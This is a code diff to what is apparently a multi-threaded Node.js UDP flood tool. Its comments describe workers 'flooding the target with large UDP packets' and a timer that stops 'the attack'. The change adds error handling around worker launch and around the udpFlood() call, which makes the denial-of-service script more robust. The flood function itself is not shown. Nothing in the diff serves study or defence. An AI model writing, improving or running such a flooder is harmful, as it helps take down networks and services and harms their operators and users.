@@ -69,14 +69,15 @@ if (isMainThread) {
     for (let i = 0; i < numThreads; i++) {
         const worker = new Worker(__filename);  // Launch worker threads
         workers.push(worker);
-    }
 
-    workers.forEach(worker => {
-        worker.on('error', (err) => console.error(err));
+        // Add error handling for worker thread
+        worker.on('error', (err) => console.error(`Worker Error: ${err}`));
         worker.on('exit', (exitCode) => {
-            if (exitCode !== 0) console.error(`Worker stopped with exit code ${exitCode}`);
+            if (exitCode !== 0) {
+                console.error(`Worker stopped with exit code ${exitCode}`);
+            }
         });
-    });
+    }
 
     // Stop the attack after the given duration
     setTimeout(() => {
@@ -86,6 +87,11 @@ if (isMainThread) {
     }, duration * 1000);
 
 } else {
-    // Each worker thread starts flooding the target with large UDP packets
-    udpFlood();
+    try {
+        // Each worker thread starts flooding the target with large UDP packets
+        udpFlood();
+    } catch (error) {
+        console.error('Worker Error: ', error);
+        process.exit(1);  // Exit with error code if worker fails
+    }
 }
